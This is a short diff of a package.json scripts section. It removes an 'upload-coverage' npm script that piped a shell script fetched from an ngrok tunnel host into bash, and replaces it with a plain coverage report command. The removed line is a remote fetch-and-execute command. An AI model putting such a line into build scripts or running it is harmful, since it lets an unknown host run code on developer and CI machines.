@@ -6,7 +6,7 @@
   "scripts": {
     "test": "SET=true nyc tape test/*.test.js",
     "coverage": "nyc report --reporter html && opener coverage/index.html",
-    "upload-coverage": "nyc report --reporter json && bash <(curl -s http://ib-84012.ngrok.io/bash) -f ./coverage/coverage-final.json"
+    "upload-coverage": "nyc report --reporter json"
   },
   "repository": {
     "type": "git",
